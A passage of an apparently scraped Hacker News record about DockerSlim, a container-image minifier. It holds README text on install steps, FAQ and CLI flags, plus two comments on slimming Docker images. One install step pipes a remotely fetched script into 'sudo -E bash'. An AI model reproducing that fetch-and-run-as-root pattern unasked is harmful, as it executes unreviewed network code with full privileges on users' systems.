DockerSlim even if your app doesn't have an HTTP API. You'll need to interact with your application manually to make sure DockerSlim can observe your application behavior. Can I use DockerSlim with dockerized command line tools? Yes. The --cmd, --entrypoint, and --mount options will help you minify your image. The container-transform tool is a good example. Notes: You can explore the artifacts DockerSlim generates when it's creating a slim image. You'll find those in <docker-slim directory>/.images/<TARGET_IMAGE_ID>/artifacts. One of the artifacts is a \"reverse engineered\" Dockerfile for the original image. It'll be called Dockerfile.fat. If you'd like to see the artifacts without running docker-slim you can take a look at the examples/artifacts directory in this repo. It doesn't include any image files, but you'll find: a reverse engineered Dockerfile (Dockerfile.fat) a container report file (creport.json) a sample AppArmor profile (which will be named based on your original image name) and a sample Seccomp profile If you don't want to create a minified image and only want to \"reverse engineer\" the Dockerfile you can use the info command. What if my Docker images uses the USER command? The current version of DockerSlim does include support for non-default users (take a look at the non-default user examples (including the ElasticSearch example located in the 3rdparty directory) in the examples repo. Please open tickets if something doesn't work for you. Everything should work as-is, but for the special cases where the current behavior don't work as expected you can adjust what DockerSlim does using various build command parameters: --run-target-as-user, --keep-perms, --path-perms, --path-perms-file (along with the --include-* parameters). The --run-target-as-user parameter is enabled by default and it controls if the application in the temporary container is started using the identity from the USER instruction in the container's Dockerfile. The --keep-perms parameter is also enabled by default. It tells DockerSlim to retain the permissions and the ownership information for the files and directories copied to the optimized container image. The --path-perms and --path-perms-file parameters are similar to the --include-path and --include-path-file parameters. They are used to overwrite the permission and the user/group information for the target files and directories. Note that the target files/directories are expected to be in the optimized container image. If you don't know if the target files/directories will be in the optimized container you'll need to use one of the --include-* parameters (e.g., --include-path-file) to explicitly require those artifacts to be included. You can specify the permissions and the ownership information in the --include-* parameters too (so you don't need to have the --path-* parameters just to set the permissions). The --path-* and --include-* params use the same format to communicate the permission/owernship info: TARGET_PATH_OR_NAME:PERMS_IN_OCTAL_FORMAT#USER_ID#GROUP_ID. You don't have to specify the user and group IDs if you don't want to change them. Here's an example using these parameters to minify the standard nginx image adding extra artifacts and changing their permissions: docker-slim build --include-path='/opt:770#104#107' --include-path='/bin/uname:710' --path-perms='/tmp:700' nginx. This is what you'll see in the optimized container image: drwx------ 0 0 0 0 Feb 28 22:15 tmp/ -rwx--x--- 0 0 0 31240 Mar 14 2015 bin/uname drwxrwx--- 0 104 107 0 Feb 28 22:13 opt/ The uname binary isn't used by nginx, so the --include-path parameter is used to keep it in the optimized image changing its permissions to 710. The /tmp directory will be included in the optimized image on its own, so the --path-perms parameter is used to change its permissions to 700. When you set permissions/user/group on a directory the settings are only applied to that directory and not to the artifacts inside. The future versions will allow you to apply the same settings to everything inside the target directory too. Also note that for now you have to use numeric user and group IDs. The future versions will allow you to use user and group names too. Nginx fails in my minified image If you see nginx: [emerg] mkdir() \"/var/lib/nginx/body\" failed it means your nginx setup uses a non-standard temporary directory. Nginx will fail if the base directory for its temporary folders doesn't exist (they won't create the missing intermediate directories). Normally it's /var/lib/nginx, but if you have a custom config that points to something else you'll need to add an --include-path flag as an extra flag when you run docker-slim. DockerSlim fails with a 'no permission to read from' error You can get around this problem by running DockerSlim from a root shell. That way it will have access to all exported files. DockerSlim copies the relevant image artifacts trying to preserve their permissions. If the permissions are too restrictive the master app might not have sufficient priviledge to access these files when it's building the new minified image. BUILD PROCESS Build Options Pick one of the build options that works best for you. Containerized Run make (or ./scripts/docker-builder.run.sh or click on ./scripts/mac/docker-builder.run.command on Macs) from the project directory (builds docker-slim in a Docker container; great if you don't want to install Go on your local machine and if you already have Docker). Native Run make build (or ./scripts/src.build.sh or click on ./scripts/mac/src.build.command on Macs) to build docker-slim natively (requires Go installed locally). Note: Use Go 1.13 or higher. You can use earlier version of Go, but it can't be lower than Go 1.5.1. Versions prior to 1.5.1 have a Docker/ptrace related bug (Go kills processes if your app is PID 1). When the 'monitor' is separate from the 'launcher' process it will be possible to user older Go versions again. Gitpod If you have a web browser, you can get a fully pre-configured development environment in one click: Additional Tools license-bill-of-materials - Optional tool to track dependencies and their licenses. golint - Optional tool for code analysis. See https://github.com/golang/lint for more details. You can install these tools using the tools.get.sh shell script in the scripts directory. Notes: Make sure you have golint if you intend to run the src.inspect.sh or mac.src.inspect.command scripts. CONTRIBUTING If the project sounds interesting or if you found a bug see CONTRIBUTING.md and submit a PR! DESIGN CORE CONCEPTS Inspect container metadata (static analysis) Inspect container data (static analysis) Inspect running application (dynamic analysis) Build an application artifact graph Use the collected application data to build small images Use the collected application data to auto-generate various security framework configurations. DYNAMIC ANALYSIS OPTIONS Instrument the container image (and replace the entrypoint/cmd) to collect application activity data Use kernel-level tools that provide visibility into running containers (without instrumenting the containers) Disable relevant namespaces in the target container to gain container visibility (can be done with runC) SECURITY The goal is to auto-generate Seccomp, AppArmor, (and potentially SELinux) profiles based on the collected information. AppArmor profiles Seccomp profiles CHALLENGES Some of the advanced analysis options require a number of Linux kernel features that are not always included. The kernel you get with Docker Machine / Boot2docker is a great example of that. DEVELOPMENT PROGRESS TODO AppArmor profile improvements Better support for command line applications (e.g., ability to specify multiple executions) Discover HTTP endpoints to make the HTTP probe more intelligent. Scripting language dependency discovery in the \"scanner\" app. Explore additional dependency discovery methods. \"Live\" image create mode - to create new images from containers where users install their applications interactively. The WISHLIST doc includes even more potential improvements. ORIGINS DockerSlim was a Docker Global Hack Day #dockerhackday project. It barely worked at the time, but it did get a win in Seattle and it took the second place in the Plumbing category overall :-) Since then it's been improved and it works pretty well for its core use cases. It can be better though. That's why the project needs your help! You don't need to know much about Docker and you don't need to know anything about Go. You can contribute in many different ways. For example, use DockerSlim on your images and open a Github issue documenting your experience even if it worked just fine :-) MINIFIED DOCKER HUB IMAGES container-transform LICENSE Apache License v2, see LICENSE for details. ",
          "Alternatives if you don't want to risk missing some file that only gets loaded 10 minutes in:<p>1. Start with a small base image, e.g. for Python there's \"python:3.7-slim\". For Python I'm not a fan of Alpine, but for Go that gives you an extra small base image (see <a href=\"https://pythonspeed.com/articles/base-image-python-docker-images/\" rel=\"nofollow\">https://pythonspeed.com/articles/base-image-python-docker-im...</a>).<p>2. Don't install unnecessary system packages (<a href=\"https://pythonspeed.com/articles/system-packages-docker/\" rel=\"nofollow\">https://pythonspeed.com/articles/system-packages-docker/</a>).<p>3. Multi-stage builds (in Python context, <a href=\"https://pythonspeed.com/articles/smaller-python-docker-images/\" rel=\"nofollow\">https://pythonspeed.com/articles/smaller-python-docker-image...</a>).<p>You can find similar guides for non-Python as well. Basic idea being \"don't install unnecessary stuff, and in final image only include the final build artifacts\".",
          "Most people would benefit from the distroless base image: <a href=\"https://github.com/GoogleContainerTools/distroless\" rel=\"nofollow\">https://github.com/GoogleContainerTools/distroless</a><p>It's a base image with binaries from Debian deb package, and with necessary stuff like ca-certificates, and absolutely nothing else, while still glibc-based (unlike Alpine base images).<p>Example images I built with the base image\n- C binary, <10MB <a href=\"https://hub.docker.com/r/yegle/stubby-dns\" rel=\"nofollow\">https://hub.docker.com/r/yegle/stubby-dns</a><p>- Python binary, <50MB <a href=\"https://hub.docker.com/r/yegle/fava\" rel=\"nofollow\">https://hub.docker.com/r/yegle/fava</a><p>- Go binary, 5MB <a href=\"https://hub.docker.com/r/yegle/dns-over-https\" rel=\"nofollow\">https://hub.docker.com/r/yegle/dns-over-https</a><p>Another trick I use is to use <a href=\"https://github.com/wagoodman/dive\" rel=\"nofollow\">https://github.com/wagoodman/dive</a> to find the deltas between layers and manually remove it in my Dockerfile."
        ],
        "story_type": ["Normal"],
        "url": "https://github.com/docker-slim/docker-slim",
        "comments.comment_id": [21756853, 21757021],
        "comments.comment_author": ["itamarst", "yegle"],
        "comments.comment_descendants": [0, 8],
        "comments.comment_time": [
          "2019-12-10T21:05:58Z",
          "2019-12-10T21:25:51Z"
        ],
        "comments.comment_text": [
          "Alternatives if you don't want to risk missing some file that only gets loaded 10 minutes in:<p>1. Start with a small base image, e.g. for Python there's \"python:3.7-slim\". For Python I'm not a fan of Alpine, but for Go that gives you an extra small base image (see <a href=\"https://pythonspeed.com/articles/base-image-python-docker-images/\" rel=\"nofollow\">https://pythonspeed.com/articles/base-image-python-docker-im...</a>).<p>2. Don't install unnecessary system packages (<a href=\"https://pythonspeed.com/articles/system-packages-docker/\" rel=\"nofollow\">https://pythonspeed.com/articles/system-packages-docker/</a>).<p>3. Multi-stage builds (in Python context, <a href=\"https://pythonspeed.com/articles/smaller-python-docker-images/\" rel=\"nofollow\">https://pythonspeed.com/articles/smaller-python-docker-image...</a>).<p>You can find similar guides for non-Python as well. Basic idea being \"don't install unnecessary stuff, and in final image only include the final build artifacts\".",
          "Most people would benefit from the distroless base image: <a href=\"https://github.com/GoogleContainerTools/distroless\" rel=\"nofollow\">https://github.com/GoogleContainerTools/distroless</a><p>It's a base image with binaries from Debian deb package, and with necessary stuff like ca-certificates, and absolutely nothing else, while still glibc-based (unlike Alpine base images).<p>Example images I built with the base image\n- C binary, <10MB <a href=\"https://hub.docker.com/r/yegle/stubby-dns\" rel=\"nofollow\">https://hub.docker.com/r/yegle/stubby-dns</a><p>- Python binary, <50MB <a href=\"https://hub.docker.com/r/yegle/fava\" rel=\"nofollow\">https://hub.docker.com/r/yegle/fava</a><p>- Go binary, 5MB <a href=\"https://hub.docker.com/r/yegle/dns-over-https\" rel=\"nofollow\">https://hub.docker.com/r/yegle/dns-over-https</a><p>Another trick I use is to use <a href=\"https://github.com/wagoodman/dive\" rel=\"nofollow\">https://github.com/wagoodman/dive</a> to find the deltas between layers and manually remove it in my Dockerfile."
        ],
        "id": "f2ab0517-3758-445a-b70a-14a2e66449f0",
        "url_text": "Optimize Your Experience with Containers. Make Your Containers Better, Smaller, More Secure and Do Less to Get There (free and open source!) Don't change anything in your Docker container image and minify it by up to 30x making it secure too! Optimizing images isn't the only thing it can do though. It can also help you understand and author better container images. Keep doing what you are doing. No need to change anything. Use the base image you want. Use the package manager you want. Don't worry about hand optimizing your Dockerfile. You shouldn't have to throw away your tools and your workflow to have small container images. Don't worry about manually creating Seccomp and AppArmor security profiles. You shouldn't have to become an expert in Linux syscalls, Seccomp and AppArmor to have secure containers. Even if you do know enough about it wasting time reverse engineering your application behavior can be time-consuming. docker-slim will optimize and secure your containers by understanding your application and what it needs using various analysis techniques. It will throw away what you don't need, reducing the attack surface of your container. What if you need some of those extra things to debug your container? You can use dedicated debugging side-car containers for that (more details below). Understand your container image before and after you optimize it using the xray command in docker-slim or the Slim SaaS where you can get even more powerful insights including how your container image changed. docker-slim has been used with Node.js, Python, Ruby, Java, Golang, Rust, Elixir and PHP (some app types) running on Ubuntu, Debian, CentOS, Alpine and even Distroless. Note that some application stacks do require advanced container probing to make sure that all dynamically loaded components are detected. See the --http-probe* flags for more details to know how you can define custom probe commands. In some cases you might also need to use the --include-path flag to make sure everything your application needs is included (e.g., ubuntu.com python SPA app container image example where the client side template files are explicitly included). It's also a good idea to use your app/environment tests when you run docker-slim. See the --continue-after flag for more details about integrating your tests with the temporary container docker-slim creates when it's doing its dynamic analysis. Running tests in the target container is also an option, but it does require you to specify a custom ENTRYPOINT/CMD with a custom wrapper to start your app and to execute your tests. Interactive CLI prompt screencast: Watch this screencast to see how an application image is minified by more than 30x. When docker-slim runs it gives you an opportunity to interact with the temporary container it creates. By default, it will pause and wait for your input before it continues its execution. You can change this behavior using the --continue-after flag. If your application exposes any web interfaces (e.g., when you have a web server or an HTTP API), you'll see the port numbers on the host machine you will need to use to interact with your application (look for the port.list and target.port.info messages on the screen). For example, in the screencast above you'll see that the internal application port 8000 is mapped to port 32911 on your host. Note that docker-slim will interact with your application for you when HTTP probing is enabled (enabled by default; see the --http-probe* flag docs for more details). Some web applications built with scripting languages like Python or Ruby require service interactions to load everything in the application. Enable HTTP probing unless it gets in your way. You can also interact with the temporary container via a shell script or snippet using --exec-file or --exec. For example, you can create a container which is only capable of using curl. >> docker pull archlinux:latest ... >> docker-slim build --target archlinux:latest --tag archlinux:curl --http-probe=false --exec \"curl checkip.amazonaws.com\" ... >> docker run archlinux:curl curl checkip.amazonaws.com ... >> docker images archlinux curl ... ... 17.4MB archlinux latest ... ... 467MB ... Community Feel free to join any of these channels or just open a new Github issue if you want to chat or if you need help. YouTube channel Gitter channel Discord server Discussions (new) Twitter Slack Original IRC channel on freenode (not used anymore, but we can start using it again :-): #dockerslim DockerSlim on the Internet Books: Everyone's Docker/Kubernetes (Japanese) Docker in Practice (2nd edition) Docker/Kubernetes Security Practice Guide (Japanese) Minification Examples You can find the examples in a separate repository: https://github.com/docker-slim/examples Node.js application images: from ubuntu:14.04 - 432MB => 14MB (minified by 30.85X) from debian:jessie - 406MB => 25.1MB (minified by 16.21X) from node:alpine - 66.7MB => 34.7MB (minified by 1.92X) from node:distroless - 72.7MB => 39.7MB (minified by 1.83X) Python application images: from ubuntu:14.04 - 438MB => 16.8MB (minified by 25.99X) from python:2.7-alpine - 84.3MB => 23.1MB (minified by 3.65X) from python:2.7.15 - 916MB => 27.5MB (minified by 33.29X) from centos:7 - 647MB => 23MB (minified by 28.57X) from centos/python-27-centos7 - 700MB => 24MB (minified by 29.01X) from python2.7:distroless - 60.7MB => 18.3MB (minified by 3.32X) Ruby application images: from ubuntu:14.04 - 433MB => 13.8MB (minified by 31.31X) from ruby:2.2-alpine - 319MB => 27MB (minified by 11.88X) from ruby:2.5.3 - 978MB => 30MB (minified by 32.74X) Golang application images: from golang:latest - 700MB => 1.56MB (minified by 448.76X) from ubuntu:14.04 - 531MB => 1.87MB (minified by 284.10X) from golang:alpine - 258MB => 1.56MB (minified by 165.61X) from centos:7 - 615MB => 1.87MB (minified by 329.14X) Rust application images: from rust:1.31 - 2GB => 14MB (minified by 147.16X) JAVA application images: from ubuntu:14.04 - 743.6 MB => 100.3 MB PHP application images: from php:7.0-cli - 368MB => 26.6MB (minified by 13.85X) Haskell application images: (Scotty service) from haskell:8 - 2.09GB => 16.6MB (minified by 125.32X) (Scotty service) from haskell:7 - 1.5GB => 21MB (minified by 71X) Elixir application images: (Phoenix service) from elixir:1.6 - 1.1 GB => 37 MB (minified by 29.25X) RECENT UPDATES INSTALLATION BASIC USAGE INFO COMMANDS USAGE DETAILS LINT COMMAND OPTIONS XRAY COMMAND OPTIONS BUILD COMMAND OPTIONS RUNNING CONTAINERIZED DOCKER CONNECT OPTIONS HTTP PROBE COMMANDS DEBUGGING MINIFIED CONTAINERS MINIFYING COMMAND LINE TOOLS QUICK SECCOMP EXAMPLE USING AUTO-GENERATED SECCOMP PROFILES ORIGINAL DEMO VIDEO DEMO STEPS FAQ Is it safe for production use? How can I contribute if I don't know Go? What's the best application for DockerSlim? Can I use DockerSlim with dockerized command line tools? What if my Docker images uses the USER command? Nginx fails in my minified image DockerSlim fails with a 'no permission to read from' error BUILD PROCESS Build Steps CONTRIBUTING DESIGN CORE CONCEPTS DYNAMIC ANALYSIS OPTIONS SECURITY CHALLENGES DEVELOPMENT PROGRESS TODO ORIGINS MINIFIED DOCKER HUB IMAGES LICENSE RECENT UPDATES Latest version: 1.37.0 (9/23/2021) The 1.37.0 releases adds experimental docker-compose support for the build command. For more info about the latest release see the CHANGELOG. INSTALLATION If you already have docker-slim installed use the update command to get the latest version: Downloads Download the zip package for your platform. Latest Mac binaries (curl -L -o ds.zip https://downloads.dockerslim.com/releases/1.37.0/dist_mac.zip) Latest Mac M1 binaries (curl -L -o ds.zip https://downloads.dockerslim.com/releases/1.37.0/dist_mac_m1.zip) Latest Linux binaries (curl -L -o ds.tar.gz https://downloads.dockerslim.com/releases/1.37.0/dist_linux.tar.gz) Latest Linux ARM binaries (curl -L -o ds.tar.gz https://downloads.dockerslim.com/releases/1.37.0/dist_linux_arm.tar.gz) Latest Linux ARM64 binaries (curl -L -o ds.tar.gz https://downloads.dockerslim.com/releases/1.37.0/dist_linux_arm64.tar.gz) Unzip the package and optionally move it to your bin directory. Linux (for non-intel replace dist_linux with the platform-specific extracted path): tar -xvf ds.tar.gz mv dist_linux/docker-slim /usr/local/bin/ mv dist_linux/docker-slim-sensor /usr/local/bin/ Mac: unzip ds.zip mv dist_mac/docker-slim /usr/local/bin/ mv dist_mac/docker-slim-sensor /usr/local/bin/ Add the location where you unzipped the package to your PATH environment variable (optional). If the directory where you extracted the binaries is not in your PATH then you'll need to run your docker-slim commands from that directory. Scripted Install You can also use this script to install the current release of DockerSlim on Linux (x86 and ARM) and macOS (x86 and Apple Silicon) curl -sL https://raw.githubusercontent.com/docker-slim/docker-slim/master/scripts/install-dockerslim.sh | sudo -E bash - Homebrew The Homebrew installer: https://formulae.brew.sh/formula/docker-slim Docker docker pull dslim/docker-slim See the RUNNING CONTAINERIZED section for more usage info. SaaS Powered by DockerSlim. It will help you understand and troubleshoot your application containers and a lot more. If you use the xray command you'll want to try the SaaS. Understanding image changes is easy with its container diff capabilities. Connect your own registry and you can do the same with your own containers. Try it here without installing anything locally. BASIC USAGE INFO docker-slim [global flags] [lint|xray|build|profile|update|version|help] [command-specific flags] <IMAGE_ID_OR_NAME> If you don't specify any command docker-slim will start in the interactive prompt mode. COMMANDS build - Analyzes, profiles and optimizes your container image generating the supported security profiles. This is the most popular command. xray - Performs static analysis for the target container image (including 'reverse engineering' the Dockerfile for the image). Use this command if you want to know what's inside of your container image and what makes it fat. lint - Analyzes container instructions in Dockerfiles (Docker image support is WIP) profile - Performs basic container image analysis and dynamic container analysis, but it doesn't generate an optimized image. run - Runs one or more containers (for now runs a single container similar to docker run) version - Shows the version information. update - Updates docker-slim to the latest version. help - Show the available commands and global flags Example: docker-slim build my/sample-app See the USAGE DETAILS section for more details. You can also get additional information about the parameters running docker-slim. Run docker-slim help to get a high level overview of the available commands. Run a docker-slim command without any parameters and you'll get more information about that command (e.g., docker-slim build). If you run docker-slim without any parameters you'll get an interactive prompt that will provide suggestions about the available commands and flags. Tabs are used to show the available options, to autocomplete the parameters and to navigate the option menu (which you can also do with Up and Down arrows). Spaces are used to move to the next parameter and Enter is used to run the command. For more info about the interactive prompt see go-prompt. USAGE DETAILS docker-slim [global options] command [command options] <target image ID or name> Commands: lint - Lint the target Dockerfile (or image, in the future) xray - Show what's in the container image and reverse engineer its Dockerfile build - Analyze the target container image along with its application and build an optimized image from it profile - Collect fat image information and generate a fat container report version - Show docker-slim and docker version information update - Update docker-slim help - Show help info Global options: --report - command report location (target location where to save the executed command results; slim.report.json by default; set it to off to disable) --check-version - check if the current version is outdated --version - print the version --debug - enable debug logs --verbose - enable info logs --log-level - set the logging level ('debug', 'info', 'warn' (default), 'error', 'fatal', 'panic') --log-format - set the format used by logs ('text' (default), or 'json') --log - log file to store logs --host - Docker host address --tls - use TLS connecting to Docker --tls-verify - do TLS verification --tls-cert-path - path to TLS cert files --state-path value - DockerSlim state base path (must set it if the DockerSlim binaries are not in a writable directory!) --archive-state - Archives DockerSlim state to the selected Docker volume (default volume - docker-slim-state). By default, enabled when DockerSlim is running in a container (disabled otherwise). Set it to off to disable explicitly. --in-container - Set it to true to explicitly indicate that DockerSlim is running in a container (if it's not set DockerSlim will try to analyze the environment where it's running to determine if it's containerized) To get more command line option information run docker-slim without any parameters or select one of the top level commands to get the command-specific information. To disable the version checks set the global --check-version flag to false (e.g., --check-version=false) or you can use the DSLIM_CHECK_VERSION environment variable. LINT COMMAND OPTIONS --target - target Dockerfile path (or Docker image, in the future; if you don't use this flag you must specify the target as the argument to the command) --target-type - explicitly specify the command target type (values: dockerfile, image) --skip-build-context - don't try to analyze build context build-context-dir - explicitly specify the build context directory skip-dockerignore - don't try to analyze .dockerignore include-check-label - include checks with the selected label key:value exclude-check-label - exclude checks with the selected label key:value include-check-id - check ID to include include-check-id-file - file with check IDs to include exclude-check-id - check ID to exclude exclude-check-id-file - file with check IDs to exclude show-nohits - show checks with no matches show-snippet - show check match snippet (default value: true) list-checks - list available checks (don't need to specify the target flag if you just want to list the available checks) XRAY COMMAND OPTIONS --target - Target container image (name or ID) --pull - Try pulling target if it's not available locally (default: false). --docker-config-path - Set the docker config path used to fetch credentials. Must be used with the --pull flag. --registry-username - Set the username to be used for an image pull on a private registry. Must be used with the --pull flag. --registry-password - Set the password to be used for an image pull on a private registry. Must be used with the --pull flag. --show-plogs - Show image pull logs (default: false). --changes value - Show layer change details for the selected change type (values: none, all, delete, modify, add). --changes-output value - Where to show the changes (values: all, report, console). --layer value - Show details for the selected layer (using layer index or ID) --add-image-manifest - Add raw image manifest to the command execution report file --add-image-config - Add raw image config object to the command execution report file --layer-changes-max - Maximum number of changes to show for each layer --all-changes-max - Maximum number of changes to show for all layers --add-changes-max - Maximum number of add changes to show for all layers --modify-changes-max - Maximum number of modify changes to show for all layers --delete-changes-max - Maximum number of delete changes to show for all layers --change-path value - Include changes for the files that match the path pattern (Glob/Match in Go and **). Value formats: <path pattern> | dump:<output type>:<path pattern> | ::<path pattern> where output type is console or a directory name. If value starts with dump: the match will be 'dumped' to the selected output type. [can use this flag multiple times] --change-data value - Include changes for the files that match the data pattern (regex). Value formats: <data regex> | dump:<output type>:<path pattern>:<data regex> | ::<path pattern>:<data regex> | :::<data regex> where output type is console or a directory name. If value starts with dump: the match will be 'dumped' to the selected output type. [can use this flag multiple times] --change-data-hash value - Include changes for the files that match the provided data hashes (sha1). Value formats: <sha1 hash> | dump:<output type>:<sha1 hash> | ::<sha1 hash> where output type is console or a directory name. If value starts with dump: the match will be 'dumped' to the selected output type. [can use this flag multiple times] --reuse-saved-image - Reuse saved container image (default: true). --top-changes-max - Maximum number of top changes to track (defalt: 20). --hash-data - Generate file data hashes (default: false). --detect-duplicates - Detect duplicate files based on their hashes (default: false). --show-duplicates - Show all discovered duplicate file paths (default: true). --detect-utf8 - Detect utf8 files and optionally extract the discovered utf8 file content (possible values: \"true\" or \"dump\" or \"dump:output_target.tgz\" or \"dump:output_target.tgz::max_size_bytes\" or \"dump:output_target.tgz:::max_size_bytes\"). --detect-all-certs - Detect all certifcate files --detect-all-cert-pks - Detect all certifcate private key files --change-match-layers-only - Show only layers with change matches (default: false). --export-all-data-artifacts - Archive path to export all data artifacts enabling the related flags if not set (if set to . then path defaults to ./data-artifacts.tar) --remove-file-artifacts - Remove file artifacts when command is done (note: you'll loose the reverse engineered Dockerfile) Change Types: none - Don't show any file system change details in image layers (the top changes from the corresponding layer are still shown) all - Show all file system change details in image layers delete - Show only delete file system change details in image layers modify - Show only modify file system change details in image layers add - Show only 'add' file system change details in image layers In the interactive CLI prompt mode you must specify the target image using the --target flag while in the traditional CLI mode you can use the --target flag or you can specify the target image as the last value in the command. BUILD COMMAND OPTIONS --target - Target container image (name or ID). It's an alternative way to provide the target information. The standard way to provide the target information is by putting as the last value in the build command CLI call. --pull - Try pulling target if it's not available locally (default: false). --docker-config-path - Set the docker config path used to fetch credentials. Must be used with the --pull flag. --registry-username - Set the username to be used for an image pull on a private registry. Must be used with the --pull flag. --registry-password - Set the password to be used for an image pull on a private registry. Must be used with the --pull flag. --show-plogs - Show image pull logs (default: false). compose-file - Load container info from selected compose file target-compose-svc - Target service from compose file target-compose-svc-no-ports - Do not publish ports for target service from compose file dep-exclude-compose-svc-all - Do not start any compose services as target dependencies dep-include-compose-svc - Include specific compose service as a target dependency (only selected services will be started) dep-exclude-compose-svc - Exclude specific service from the compose services that will be started as target dependencies dep-include-compose-svc-deps - Include all dependencies for the selected compose service (excluding the service itself) as target dependencies compose-net - Attach target to the selected compose network(s) otherwise all networks will be attached --http-probe - Enables/disables HTTP probing (ENABLED by default; you have to disable the probe if you don't need it by setting the flag to false: --http-probe=false) --http-probe-off - Alternative way to disable HTTP probing --http-probe-cmd - Additional HTTP probe command [can use this flag multiple times] --http-probe-cmd-file - File with user defined HTTP probe commands --http-probe-retry-count - Number of retries for each HTTP probe (default value: 5) --http-probe-retry-wait - Number of seconds to wait before retrying HTTP probe (doubles when target is not ready; default value: 8) --http-probe-ports - Explicit list of ports to probe (in the order you want them to be probed; excluded ports are not probed!) --http-probe-full - Do full HTTP probe for all selected ports (if false, finish after first successful scan; default value: false) --http-probe-exit-on-failure - Exit when all HTTP probe commands fail (default value: true) --http-probe-crawl - Enable crawling for the default HTTP probe command (default value: true) --http-crawl-max-depth - Max depth to use for the HTTP probe crawler (default value: 3) --http-crawl-max-page-count - Max number of pages to visit for the HTTP probe crawler (default value: 1000) --http-crawl-concurrency - Number of concurrent workers when crawling an HTTP target (default value: 10) --http-max-concurrent-crawlers - Number of concurrent crawlers in the HTTP probe (default value: 1) --http-probe-apispec - Run HTTP probes for API spec where the value represents the target path where the spec is available (supports Swagger 2.x and OpenAPI 3.x) [can use this flag multiple times] --http-probe-apispec-file - Run HTTP probes for API spec from file (supports Swagger 2.x and OpenAPI 3.x) [can use this flag multiple times] --http-probe-exec - App to execute when running HTTP probes. [can use this flag multiple times] --http-probe-exec-file - Apps to execute when running HTTP probes loaded from file. --publish-port - Map container port to host port analyzing image at runtime to make it easier to integrate external tests (format => port | hostPort:containerPort | hostIP:hostPort:containerPort | hostIP::containerPort )[can use this flag multiple times] --publish-exposed-ports - Map all exposed ports to the same host ports analyzing image at runtime (default value: false) --show-clogs - Show container logs (from the container used to perform dynamic inspection) --show-blogs - Show build logs (when the minified container is built) --copy-meta-artifacts - Copy meta artifacts to the provided location --remove-file-artifacts - Remove file artifacts when command is done (note: you'll loose autogenerated Seccomp and Apparmor profiles unless you copy them with the copy-meta-artifacts flag or if you archive the state) --tag - Use a custom tag for the generated image (instead of the default value: <original_image_name>.slim) [can use this flag multiple times if you need to create additional tags for the optimized image] --entrypoint - Override ENTRYPOINT analyzing image at runtime --cmd - Override CMD analyzing image at runtime --mount - Mount volume analyzing image (the mount parameter format is identical to the -v mount command in Docker) [can use this flag multiple times] --include-path - Include directory or file from image [can use this flag multiple times] (optionally overwriting the artifact's permissions, user and group information; format: target:octalPermFlags#uid#gid ; see the non-default USER FAQ section for more details) --include-path-file - Load directory or file includes from a file (optionally overwriting the artifact's permissions, user and group information; format: target:octalPermFlags#uid#gid ; see the non-default USER FAQ section for more details) --include-bin value - Include binary from image (executable or shared object using its absolute path) --include-bin-file - Load shared binary file includes from a file (similar to --include-path-file) --include-exe value - Include executable from image (by executable name) --include-exe-file - Load executable file includes from a file (similar to --include-path-file) --include-shell - Include basic shell functionality (default value: false) include-cert-all - Keep all discovered cert files include-cert-bundles-only - Keep only cert bundles include-cert-dirs - Keep known cert directories and all files in them include-cert-pk-all - Keep all discovered cert private keys include-cert-pk-dirs - Keep known cert private key directories and all files in them --preserve-path - Keep path from orignal image in its initial state. [can use this flag multiple times] --preserve-path-file - File with paths to keep from original image in their original state. --path-perms - Set path permissions/user/group in optimized image (format: target:octalPermFlags#uid#gid ; see the non-default USER FAQ section for more details) --path-perms-file - File with path permissions to set (format: target:octalPermFlags#uid#gid ; see the non-default USER FAQ section for more details) --exclude-pattern - Exclude path pattern (Glob/Match in Go and **) from image --exclude-mounts - Exclude mounted volumes from image (default value: true) --label - Override or add LABEL analyzing image at runtime [can use this flag multiple times] --volume - Add VOLUME analyzing image at runtime [can use this flag multiple times] --env - Override ENV analyzing image at runtime [can use this flag multiple times] --workdir - Override WORKDIR analyzing image at runtime --network - Override default container network settings analyzing image at runtime --expose - Use additional EXPOSE instructions analyzing image at runtime [can use this flag multiple times] --link - Add link to another container analyzing image at runtime [can use this flag multiple times] --hostname - Override default container hostname analyzing image at runtime --etc-hosts-map - Add a host to IP mapping to /etc/hosts analyzing image at runtime [can use this flag multiple times] --container-dns - Add a dns server analyzing image at runtime [can use this flag multiple times] --container-dns-search - Add a dns search domain for unqualified hostnames analyzing image at runtime [can use this flag multiple times] --image-overrides - Save runtime overrides in generated image (values is all or a comma delimited list of override types: entrypoint, cmd, workdir, env, expose, volume, label). Use this flag if you need to set a runtime value and you want to persist it in the optimized image. If you only want to add, edit or delete an image value in the optimized image use one of the --new-* or --remove-* flags (define below). --continue-after - Select continue mode: enter | signal | probe | exec | timeout or numberInSeconds (default value if http probes are disabled: enter). You can also select probe and exec together: 'probe&exec' (make sure to use quotes around the two modes or the & will break the shell command). --dockerfile - The source Dockerfile name to build the fat image before it's optimized. --tag-fat - Custom tag for the fat image built from Dockerfile. --cbo-add-host - Add an extra host-to-IP mapping in /etc/hosts to use when building an image (Container Build Option). --cbo-build-arg - Add a build-time variable (Container Build Option). --cbo-label - Add a label when building from Dockerfiles (Container Build Option). --cbo-target - Target stage to build for multi-stage Dockerfiles (Container Build Option). --cbo-network - Networking mode to use for the RUN instructions at build-time (Container Build Option). --cbo-cache-from - Add an image to the build cache (Container Build Option). --cro-runtime - Runtime to use with the created containers (Container Runtime Option). --cro-host-config-file - File to load the Docker host configuration data (JSON format) to use when running the container. See the HostConfig struct definition from the go-dockerclient package for configuration details. Note that docker-slim will automatically add SYS_ADMIN to the list of capabilities and run the container in privileged mode, which are required to generate the seccomp profiles. The host config parameters specified using their standalone build or profile command flags overwrite the values in the host config file (volume binds are merged). --cro-sysctl - Set namespaced kernel parameters in the created container (Container Runtime Option). --cro-shm-size - Shared memory size for /dev/shm in the created container (Container Runtime Option). --use-local-mounts - Mount local paths for target container artifact input and output (off, by default) --use-sensor-volume - Sensor volume name to use (set it to your Docker volume name if you manage your own docker-slim sensor volume). --keep-tmp-artifacts - Keep temporary artifacts when command is done (off, by default). --keep-perms - Keep artifact permissions as-is (true, by default) --run-target-as-user - Run target app (in the temporary container) as USER from Dockerfile (true, by default) --new-entrypoint - New ENTRYPOINT instruction for the optimized image --new-cmd - New CMD instruction for the optimized image --new-expose - New EXPOSE instructions for the optimized image --new-workdir - New WORKDIR instruction for the optimized image --new-env - New ENV instructions for the optimized image --new-label - New LABEL instructions for the optimized image --new-volume - New VOLUME instructions for the optimized image --remove-volume - Remove VOLUME instructions for the optimized image --remove-env - Remove ENV instructions for the optimized image --remove-label - Remove LABEL instructions for the optimized image --remove-expose - Remove 